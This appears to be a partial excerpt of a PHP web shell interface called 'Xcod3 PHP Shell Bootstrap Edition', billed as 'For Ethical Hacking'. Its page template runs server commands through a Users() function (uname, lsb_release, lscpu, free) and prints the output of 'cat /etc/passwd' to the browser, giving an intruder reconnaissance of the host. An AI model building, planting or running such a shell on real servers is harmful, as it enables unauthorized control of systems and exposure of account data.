...
<nav class="navbar navbar-inverse top-navbar" id="top-nav">
  <div class="container-fluid">
    <div class="navbar-header">      
      <a class="navbar-brand" href="<?php echo $_SERVER['PHP_SELF'];?>"><img class="img-responsive" src="0011.png" width="150" height="20"></a>
    </div>    
    ...
    <div class="container-2">
     ...
     <div class="col-md-12">
      <div class="page-title">
        <ol class="breadcrumb">
         <li class="active"><i class="fa fa-dashboard"></i> Selamat datang, <?php echo Users('uname -n');?> di Xcod3 PHP Shell Bootstrap Edition <small> For Ethical Hacking.</small></li>
          <li class="pull-right">
  ...
  <div class="row">
      ...
      <div class="card card-primary card-outline">
        <div class="card-body box-profile">
          <div class="text-center">
            <img class="profile-user-img img-fluid img-square" src="0011.png" alt="ALIF FUSOBAR">
          </div>
           <h3 class="profile-username text-center">Xcod3 PHP Shell Bootstrap Edition</h3>
           <p class="text-muted text-center">For Ethical Hacking</p>
          </div>
          <!-- /.card-body -->
        </div>
        <!-- /.card -->  
   ...
   <div class="row">
     <div class="col-md-12">
       ...
       <div class="page-title">
           <ol class="breadcrumb">
            <li class=""><i class="fa fa-desktop"></i> OS: <?php echo Users('uname -s');?> | Kernel: <?php echo Users('uname -r');?> | Release: <?php echo Users('uname -v');?> | Machine: <?php echo Users('uname -m');?> | Hostname: <?php echo Users('uname -n');?></li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo Users('lsb_release -i');?> | <?php echo Users('lsb_release -d');?> | <?php echo Users('lsb_release -r');?> | <?php echo Users('lsb_release -c');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo Users('php -v');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo Users('lscpu');?> </li>
           </ol>

           <ol class="breadcrumb">
            <li class=""><i class="fa fa-linux"></i> <?php echo Users('free');?> </li>
           </ol>
       ...
       <div class="card card-primary card-outline">
        ...
        <ul class="list-group list-group-unbordered mb-12">
          ...
          <li class="list-group-item">
            <pre><?php echo Users('cat /etc/passwd'); ?></pre>
          </li>
        </ul>
        <?php
           }
   ...
   <div class="row">
     <div class="col-md-12">
      <div class="card card-primary card-outline">
        <div class="card-body box-profile">
           <h3 class="profile-username text-center">Create with <i class="fa fa-heart"></i> Master ITSecurity Indonesia.</h3>
           <p class="text-muted text-center">Template Sumit Xcod3 | AdminLTE | Recode by ForYou.</p>
          </div>
          <!-- /.card-body -->
        </div>
        <!-- /.card -->  
